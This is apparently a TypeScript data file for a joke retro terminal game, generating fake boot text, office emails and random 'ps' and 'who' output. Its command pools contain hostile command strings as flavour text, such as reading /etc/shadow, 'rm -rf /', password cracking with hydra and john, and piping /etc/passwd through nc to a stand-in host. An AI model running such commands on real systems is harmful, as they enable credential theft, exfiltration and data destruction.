export type OutputLine = {
	text: string;
	instant?: boolean;
};

export const BOOT_SEQUENCE: OutputLine[] = [
	{ text: 'Zero One Recovery Kernel — ZORK v2.1', instant: true },
	{ text: '"Lowering expectations since our court date"', instant: true },
	{ text: 'Kelso, WA - Garage Datacenter', instant: true },
	{ text: '', instant: true },
	{ text: 'Performing system checks...', instant: true },
	{ text: 'Memory: 640K (should be enough for anyone)', instant: true },
	{ text: 'Disk: /dev/garage0 mounted', instant: true },
	{ text: 'Network: 3 of 7 neighbor WiFi connections... ACTIVE', instant: true },
	{ text: '(idpromnut is trying to change his SSID to keep us out again...)', instant: true },
	{ text: "UPS: Extension cord to neighbor's house... OK", instant: true },
	{ text: 'Cooling: Garage door open... CONFIRMED', instant: true },
	{ text: '', instant: true },
];

export const EMAILS = [
	{
		id: 1,
		from: 'billing@zeroone.local',
		subject: '*** ALERT *** Accounting discrepancy - $0.75',
		date: 'Mon Aug 11 07:45:02 1986',
		body: `From: billing@zeroone.local
To: sysadmin@zeroone.local
Date: Mon Aug 11 07:45:02 1986
Subject: *** ALERT *** Accounting discrepancy - $0.75

Sysadmin,

The automated billing reconciliation script found a $0.75 discrepancy
in the Q3 accounts. This is NOT the taco fund. This is real money.

Ledger entry ref: INV-1986-0811-004
Expected: $142.25
Actual:   $141.50
Delta:    -$0.75

Please investigate and reply-all. Cosworth is already
upset and he controls the garage door opener. And mr.pink
controls the disco ball, so let's not get him involved.

-- ZeroOne Billing Daemon (cron job, mostly works)`,
	},
	{
		id: 2,
		from: 'ops@zeroone.local',
		subject: 'Garage door left open AGAIN',
		date: 'Mon Aug 11 06:02:17 1986',
		body: `From: ops@zeroone.local
To: all@zeroone.local
Date: Mon Aug 11 06:02:17 1986
Subject: Garage door left open AGAIN

Whoever left the garage door open last night: the servers got wet.
Rack 1 (the card table) is fine. Rack 2 (the TV tray) has some
moisture on the power strip. It dried out. Probably fine.

Please close the door when you leave. We cannot afford another
incident. We literally cannot. The Kona's warranty doesn't cover this.

Also a raccoon got in. It did not touch the servers. Respect.

-- Ops (Dave)`,
	},
	{
		id: 3,
		from: 'tacobell-order@zeroone.local',
		subject: 'GROUP TACO ORDER - respond by 11:30',
		date: 'Mon Aug 11 08:00:44 1986',
		body: `From: tacobell-order@zeroone.local
To: all@zeroone.local
Date: Mon Aug 11 08:00:44 1986
Subject: GROUP TACO ORDER - respond by 11:30

Doing a Taco Bell run at noon. Reply with your order.

Current orders:
  Dave    - 3x taco, 1x burrito
  Sandra  - 2x taco (no sour cream, she means it this time)
  Mike    - waiting to see what Dave gets and then getting the same

If you don't reply by 11:30 you get whatever's left over. Last week
that was a cinnamon twist and nobody was happy.

Cash only. The card reader is still "in transit" from Radio Shack.

-- Taco Automated Curro Ordering (TACO v0.3, use at own risk)`,
	},
	{
		id: 4,
		from: 'kona-monitor@zeroone.local',
		subject: 'Kona battery: 23% - CHARGING REMINDER',
		date: 'Sun Aug 10 23:47:59 1986',
		body: `From: kona-monitor@zeroone.local
To: sysadmin@zeroone.local
Date: Sun Aug 10 23:47:59 1986
Subject: Kona battery: 23% - CHARGING REMINDER

AUTOMATED ALERT from the Hyundai Kona Datacenter Power Monitor

The Kona is at 23% battery. This is the backup power supply for
Rack 1 and the network switch. If it dies so does the internet.

Charging schedule:
  Sun night  - Mike's house (he said it's fine, don't ask again)
  Mon-Wed    - Neighbor's extension cord (see UPS config)
  Thu-Sat    - TBD / pray

Action required: plug in the car.

-- KonaWatch v1.0 (runs on the Kona's own battery, we know)`,
	},
];

export const WHO_ALWAYS = ['sysadmin', 'root'];
export const WHO_RARE = ['sventek', 'guest', 'bsherwin', 'hunter', 'sdinet', 'fieldsvc', 'uucp'];
export const WHO_POOL = [
	'wendell',
	'salem',
	'craft',
	'coffee',
	'hacker',
	'cosworth',
	'mr.pink',
	'idpromnut',
	'dirk',
	'lickity',
	'geerling',
	'technotim',
	'networkchuck',
	'wolfgangs',
	'lawrence',
	'spacerex',
	'dbtech',
	'raidowl',
	'lempa',
	'ychto',
];

export function pick<T>(arr: T[]): T {
	return arr[Math.floor(Math.random() * arr.length)];
}

export const PS_COMMANDS: Array<() => string> = [
	// Classic insecure protocols
	() =>
		`telnet ${pick(['bbs.zeroone.local', 'neighbor-pc', 'pentagon.mil', 'mainframe', 'tacobell.com', 'kremlin.su', 'bbs.mit.edu', 'compuserve.com'])} ${pick(['', '25', '23', '80', '110', '31337'])}`.trim(),
	() =>
		`finger ${pick(['-l ', ''])}@${pick(['mit.edu', 'stanford.edu', 'kremlin.su', 'zeroone.local', 'neighbor-wifi-3', 'pentagon.mil', 'nsa.gov'])}`,
	() =>
		`rlogin ${pick(['pentagon.mil', 'mainframe', 'neighbor-pc', 'norad.gov', 'wopr.mil', 'tacobell-hq'])}`,
	() =>
		`rsh ${pick(['neighbor-pc', 'gateway', 'mainframe', 'kona-dashboard'])} "${pick(['cat /etc/shadow', 'rm -rf /', 'reboot', 'wall TACOS', 'shutdown -h now', 'cat /etc/passwd'])}"`,
	() =>
		`rcp root@${pick(['gateway', 'neighbor-pc', 'mainframe'])}:${pick(['/etc/hosts', '/etc/passwd', '/etc/shadow', '/var/log/auth.log'])} .`,
	() =>
		`rexec ${pick(['mainframe', 'neighbor-pc', 'gateway'])} ${pick(['uptime', 'whoami', 'cat /etc/passwd', 'reboot'])}`,
	() =>
		`ftp ${pick(['warez.underground.net', 'files.tacobell.com', 'neighbor-nas', 'totally-legal-software.ru', 'bbs.homelabs.net'])}`,
	() =>
		`tftp ${pick(['get', 'put'])} ${pick(['firmware.bin', 'config.bak', 'passwords.txt', 'taco-recipes.tar', 'router-backup.img'])}`,

	// Questionable file operations
	() =>
		`chmod ${pick(['777', '666', '000', '444'])} ${pick(['/', '/etc/passwd', '/dev/garage0', '/var/log/auth.log', '/home/*/.*', '/usr/bin/sudo'])}`,
	() =>
		`dd if=${pick(['/dev/zero', '/dev/urandom', '/dev/garage0', '/dev/kona'])} of=${pick(['/dev/garage0', '/dev/null', '/tmp/evidence', '/mnt/backup/tacos.img', '/dev/neighbor-wifi'])}`,
	() =>
		`rm -rf ${pick(['/tmp/evidence', '/var/log/*', '~/.bash_history', '/home/hacker', '/opt/totally-not-stolen'])}`,
	() =>
		`tar ${pick(['xvf', 'cvf', 'xzf'])} ${pick(['secrets.tar.gz', 'warez.tar', 'taco-recipes.bak', 'definitely-not-pirated.tar.xz', 'neighbor-wifi-passwords.tar', 'evidence-backup.tar.gz'])}`,
	() =>
		`cat ${pick(['/etc/passwd', '/etc/shadow', '/var/log/auth.log', '/dev/urandom', '/proc/kcore', '~/.ssh/id_rsa'])}`,
	() =>
		`mount ${pick(['/dev/kona', '/dev/garage0', '/dev/floppy0', '//neighbor-pc/share'])} ${pick(['/mnt/backup', '/mnt/tacos', '/mnt/evidence', '/mnt/warez'])}`,

	// Network shenanigans
	() => `nc -l ${pick(['31337', '1337', '4444', '8080', '6969', '12345'])}`,
	() =>
		`traceroute ${pick(['kremlin.su', 'pentagon.mil', 'tacobell.com', 'neighbor-wifi-3', 'area51.gov', 'nsa.gov', 'whopper.net'])}`,
	() =>
		`nslookup ${pick(['suspicious.host', 'totally-not-malware.ru', 'free-tacos.com', 'neighbor-wifi-password.txt', 'definitely-legit.cn'])}`,
	() =>
		`ping ${pick(['127.0.0.1', 'neighbor-wifi-3', 'tacobell.com', 'kremlin.su', 'localhost', '255.255.255.255'])}`,
	() =>
		`ssh ${pick(['neighbor-wifi-3', 'root@gateway', 'admin@kona-dashboard', 'guest@pentagon.mil'])}`,
	() =>
		`curl ${pick(['tacobell.com/menu', 'free-ram-download.com', 'is-my-garage-door-open.zeroone.local', 'whatismyip.com', 'definitely-not-a-virus.ru/download'])}`,
	() =>
		`wget ${pick(['ftp://warez.underground/utils.zip', 'http://free-tacos.com/coupon.exe', 'http://more-ram.com/download-ram.tar', 'http://tacobell.com/secret-menu.pdf'])}`,
	() => `wifi-scanner --${pick(['neighbors', 'all', 'passwords', 'deauth', 'sniff'])}`,
	() =>
		`sendmail -t < ${pick(['newsletter.txt', 'ransom-note.txt', 'taco-order.msg', 'resignation-letter.txt', 'all-reply-oops.txt'])}`,

	// Editors and shells
	() =>
		`${pick(['vi', 'emacs -nw', 'ed', 'nano'])} ${pick(['config.sys', '/etc/passwd', 'exploit.c', 'taco-order.txt', '.plan', 'resignation-letter.txt', 'todo.md'])}`,
	() =>
		`${pick(['gcc -O2', 'cc'])} ${pick(['exploit.c', 'backdoor.c', 'taco-tracker.c', 'wifi-crack.c', 'kona-battery-monitor.c', 'garage-door-iot.c'])}`,
	() =>
		`make ${pick(['world', 'clean', 'install', 'tacos', 'trouble', 'love-not-war', 'it-stop'])}`,

	// Surveillance and monitoring
	() =>
		`tail -f ${pick(['/var/log/syslog', '/var/log/auth.log', '/var/log/taco-orders', '/dev/garage-door-sensor', '/var/log/neighbor-complaints'])}`,
	() =>
		`tcpdump -i ${pick(['eth0', 'wlan0', 'neighbor-bridge', 'kona-hotspot'])} ${pick(['port 23', 'port 80', 'host kremlin.su', 'host tacobell.com', ''])}`.trim(),
	() =>
		`${pick(['kona-monitor --battery-check', 'kona-monitor --range-anxiety', 'kona-monitor --is-plugged-in', 'kona-monitor --neighbor-outlet-status'])}`,
	() =>
		`garage-door ${pick(['--status', '--open', '--close', '--ask-cosworth', '--raccoon-check'])}`,
	() =>
		`disco-ball --${pick(['strobe', 'slow-rotate', 'mirror-check', 'party-mode', 'mr-pink-approved'])}`,

	// Games and time wasters
	() =>
		pick([
			'nethack',
			'rogue',
			'adventure',
			'zork',
			'sl',
			'fortune | cowsay',
			'banner TACOS',
			'worm',
			'rain',
			'fish',
		]),

	// Taco operations
	() =>
		`taco-order ${pick(['--extra-cheese', '--no-lettuce', '--baja-blast', '--party-pack', '--surprise-me', '--for-cosworth', '--bulk 50'])}`,
	() => `talk ${pick(['mr.pink', 'cosworth', 'dirk', 'wendell', 'idpromnut'])}`,
	() =>
		`wall "${pick(['garage door is open', 'who took my tacos', 'kona is at 2%', 'disco ball is stuck', 'TACO ORDER IN 5 MIN', 'raccoon is back', 'idpromnut changed his SSID again'])}"`,

	// Kali / pentest tools
	() =>
		`nmap ${pick(['-sS', '-sV', '-A', '-O', '--script vuln'])} ${pick(['neighbor-wifi-3', '192.168.1.0/24', 'pentagon.mil', 'tacobell.com', 'zeroone.local', '10.0.0.0/8'])}`,
	() =>
		`aircrack-ng ${pick(['-w /usr/share/wordlists/rockyou.txt neighbor.cap', '--bssid DE:AD:BE:EF:CA:FE dump-01.cap', '-a2 -b 00:11:22:33:44:55 capture.cap'])}`,
	() =>
		`hydra -l admin -P ${pick(['/usr/share/wordlists/rockyou.txt', 'taco-passwords.txt', 'neighbor-guesses.txt'])} ${pick(['neighbor-wifi-3', 'gateway', 'kona-dashboard', 'tacobell.com'])} ${pick(['ssh', 'ftp', 'telnet', 'http-post-form'])}`,
	() =>
		`john ${pick(['--wordlist=/usr/share/wordlists/rockyou.txt', '--rules', '--incremental'])} ${pick(['hashes.txt', '/etc/shadow', 'neighbor-hashes.txt'])}`,
	() =>
		`hashcat -m ${pick(['0', '1000', '2500', '5600'])} -a 0 ${pick(['hashes.txt', 'ntlm-dump.txt', 'wifi-handshake.hccapx'])} ${pick(['rockyou.txt', 'taco-menu-wordlist.txt'])}`,
	() =>
		`metasploit ${pick(['exploit/multi/handler', 'auxiliary/scanner/ssh/ssh_login', 'exploit/unix/ftp/vsftpd_234_backdoor', 'auxiliary/scanner/portscan/tcp'])}`,
	() =>
		`sqlmap -u "${pick(['http://tacobell.com/order?id=1', 'http://zeroone.local/billing?acct=1', 'http://neighbor-nas/login.php?user=admin'])}" ${pick(['--dbs', '--dump', '--os-shell', '--batch'])}`,
	() =>
		`nikto -h ${pick(['http://zeroone.local', 'http://neighbor-nas', 'http://tacobell.com', 'http://kona-dashboard:8080'])}`,
	() =>
		`burpsuite ${pick(['--project tacobell-audit', '--project neighbor-wifi-portal', '--project zeroone-billing'])}`,
	() => `responder -I ${pick(['eth0', 'wlan0', 'neighbor-bridge'])} ${pick(['-wrf', '-wrfv'])}`,
	() => `wireshark -i ${pick(['eth0', 'wlan0', 'neighbor-bridge', 'kona-hotspot'])} -k`,
	() => `airmon-ng ${pick(['start', 'check kill'])} ${pick(['wlan0', 'wlan1'])}`,
	() =>
		`ettercap -T -q -i ${pick(['eth0', 'wlan0'])} -M arp:remote /${pick(['192.168.1.1', '10.0.0.1'])}/ /${pick(['192.168.1.0/24', '10.0.0.0/24'])}/`,
	() =>
		`gobuster dir -u ${pick(['http://zeroone.local', 'http://neighbor-nas', 'http://tacobell.com'])} -w ${pick(['/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt', 'taco-dirs.txt'])}`,
	() => `enum4linux ${pick(['-a', '-U', '-S'])} ${pick(['neighbor-pc', 'gateway', 'mainframe'])}`,

	// Delightfully wrong
	() => `fsck ${pick(['/dev/garage0', '/dev/kona', '/dev/neighbor-wifi', '/dev/disco-ball'])}`,
	() =>
		`crontab -e # ${pick(['schedule taco run', 'auto-reboot at 3am', 'steal wifi hourly', 'check garage door', 'rotate disco ball'])}`,
	() =>
		`uudecode ${pick(['suspicious.uu', 'totally-a-pdf.uu', 'not-malware.uu', 'taco-coupon.uu'])}`,
	() =>
		`${pick(['last', 'lastlog', 'w', 'uptime', 'who -a', 'users', 'top', 'htop', 'iotop', 'df -h', 'du -sh /*', 'free -m', 'vmstat'])}`,
	() =>
		`awk '{print $${pick(['3', '1', 'NF'])}}'  ${pick(['access.log', '/etc/passwd', 'taco-receipts.csv', 'neighbor-ssid-history.log'])}`,
];

export const SYSTEM_PROCS = [
	// init and kernel
	{ user: 'root', pid: 1, prog: 'init [3]' },
	{ user: 'root', pid: 2, prog: '[kthreadd]' },
	{ user: 'root', pid: 3, prog: '[ksoftirqd/0]' },
	{ user: 'root', pid: 7, prog: '[kworker/0:0H-garage-door-sensor]' },
	// system daemons
	{ user: 'root', pid: 42, prog: '/usr/sbin/sshd -D' },
	{ user: 'root', pid: 58, prog: '/usr/sbin/cron' },
	{ user: 'root', pid: 63, prog: 'syslogd -m 0' },
	{ user: 'root', pid: 71, prog: '/usr/sbin/inetd' },
	{ user: 'daemon', pid: 80, prog: '/usr/sbin/atd' },
	{ user: 'root', pid: 89, prog: 'dhclient neighbor-wifi-3' },
	{ user: 'root', pid: 94, prog: 'wpa_supplicant -i wlan0 -c /etc/neighbor-passwords.conf' },
];

export const OPENSTACK_PROCS: Array<() => { user: string; prog: string }> = [
	() => ({
		user: 'nova',
		prog: `nova-${pick(['compute', 'api', 'scheduler', 'conductor', 'novncproxy'])}`,
	}),
	() => ({
		user: 'neutron',
		prog: `neutron-${pick(['server', 'dhcp-agent', 'l3-agent', 'openvswitch-agent', 'metadata-agent'])}`,
	}),
	() => ({ user: 'glance', prog: `glance-${pick(['api', 'registry'])}` }),
	() => ({ user: 'cinder', prog: `cinder-${pick(['api', 'scheduler', 'volume'])}` }),
	() => ({ user: 'keystone', prog: `keystone-${pick(['admin', 'public', 'wsgi'])}` }),
	() => ({ user: 'heat', prog: `heat-${pick(['api', 'engine', 'api-cfn'])}` }),
	() => ({
		user: 'swift',
		prog: `swift-${pick(['proxy-server', 'object-server', 'container-server', 'account-server'])}`,
	}),
	() => ({ user: 'horizon', prog: 'apache2 -k start -DFOREGROUND # horizon' }),
	() => ({ user: 'rabbitmq', prog: 'beam.smp -W w -K true -- -root /usr/lib/erlang' }),
	() => ({ user: 'mysql', prog: '/usr/sbin/mysqld --basedir=/usr' }),
	() => ({ user: 'memcache', prog: 'memcached -m 64 -p 11211 -u memcache' }),
];

export function generateWho(): string[] {
	const count = 3 + Math.floor(Math.random() * 4); // 3-6 random users
	const shuffled = WHO_POOL.slice().sort(() => Math.random() - 0.5);
	const picked = shuffled.slice(0, count);
	const users = [...WHO_ALWAYS, ...picked];

	// ~15% chance a suspicious user appears
	if (Math.random() < 0.15) {
		users.push(pick(WHO_RARE));
	}

	const hours = ['06', '07', '08', '09', '10', '11', '23'];
	const minutes = () => String(Math.floor(Math.random() * 60)).padStart(2, '0');

	return users.map((user, i) => {
		const tty = user === 'root' ? 'console' : `tty${String(i + 1).padStart(2, '0')}`;
		const h = hours[Math.floor(Math.random() * hours.length)];
		return `${user.padEnd(14)}${tty.padEnd(10)}Aug 11 ${h}:${minutes()}`;
	});
}

export function generatePs(): string[] {
	const header = 'USER           PID  %CPU %MEM    TIME COMMAND';

	// System processes (always shown, pick a random subset)
	const sysprocs = SYSTEM_PROCS.slice()
		.sort(() => Math.random() - 0.5)
		.slice(0, 5 + Math.floor(Math.random() * 4));
	const syslines = sysprocs
		.sort((a, b) => a.pid - b.pid)
		.map((p) => {
			const cpu = (Math.random() * 0.5).toFixed(1);
			const mem = (Math.random() * 2).toFixed(1);
			return `${p.user.padEnd(14)} ${String(p.pid).padStart(5)}  ${cpu.padStart(4)}  ${mem.padStart(4)}  ${`${Math.floor(Math.random() * 300)}:${String(Math.floor(Math.random() * 60)).padStart(2, '0')}`.padStart(6)} ${p.prog}`;
		});

	// OpenStack processes (pick 3-6)
	const osCount = 3 + Math.floor(Math.random() * 4);
	const osprocs = OPENSTACK_PROCS.slice()
		.sort(() => Math.random() - 0.5)
		.slice(0, osCount);
	const oslines = osprocs.map((gen) => {
		const p = gen();
		const pid = 200 + Math.floor(Math.random() * 300);
		const cpu = (Math.random() * 15).toFixed(1);
		const mem = (Math.random() * 8).toFixed(1);
		return `${p.user.padEnd(14)} ${String(pid).padStart(5)}  ${cpu.padStart(4)}  ${mem.padStart(4)}  ${`${Math.floor(Math.random() * 60)}:${String(Math.floor(Math.random() * 60)).padStart(2, '0')}`.padStart(6)} ${p.prog}`;
	});

	// User processes
	const users = WHO_POOL.slice()
		.sort(() => Math.random() - 0.5)
		.slice(0, 4 + Math.floor(Math.random() * 4));
	const userlines = users.map((user) => {
		const prog = pick(PS_COMMANDS)();
		const pid = String(500 + Math.floor(Math.random() * 9500)).padStart(5, ' ');
		const cpu = (Math.random() * (prog.includes('make') || prog.includes('gcc') ? 80 : 12)).toFixed(
			1,
		);
		const mem = (Math.random() * (prog.includes('emacs') ? 40 : 8)).toFixed(1);
		const mins = Math.floor(Math.random() * 59);
		const secs = Math.floor(Math.random() * 59);
		const time = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
		return `${user.padEnd(14)} ${pid}  ${cpu.padStart(4)}  ${mem.padStart(4)}  ${time.padStart(6)} ${prog}`;
	});

	// ~15% chance a suspicious user appears with a sketchy process
	if (Math.random() < 0.15) {
		const suspect = pick(WHO_RARE);
		const sketchy = pick([
			'cat /etc/passwd | nc kremlin.su 4444',
			'find / -name "*.mil" -exec cat {} \\;',
			'grep -r "sdi" /opt/ /var/',
			'rlogin pentagon.mil -l guest',
			'tar czf /tmp/.exfil.tar.gz /etc/shadow /var/log/auth.log',
			'finger -l @milnet.arpa',
			'telnet dockmaster.arpa 23',
			'rsh mainframe "cat /etc/passwd" > /tmp/.harvest',
		]);
		const pid = String(9900 + Math.floor(Math.random() * 99)).padStart(5, ' ');
		userlines.push(
			`${suspect.padEnd(14)} ${pid}   ${(Math.random() * 2).toFixed(1).padStart(4)}   ${(Math.random() * 1).toFixed(1).padStart(4)}  ${'03:14'.padStart(6)} ${sketchy}`,
		);
	}

	return [header, ...syslines, ...oslines, ...userlines];
}

export const HELP_TEXT = [
	'Available commands:',
	'',
	'  ls [path]    List directory contents (-a to show hidden)',
	'  cat <path>   Print file contents',
	'  cd [path]    Change directory',
	'  pwd          Print working directory',
	'  mail         Read your mail',
	'  read <n>     Read message number <n>',
	'  who          Show logged-in users',
	'  ps           Show running processes',
	'  date         Show current date and time',
	'  clear        Clear the terminal',
	'  tacos        Open taco ordering system',
	'  zork         Play Zork I',
	'  help         Show this help',
];
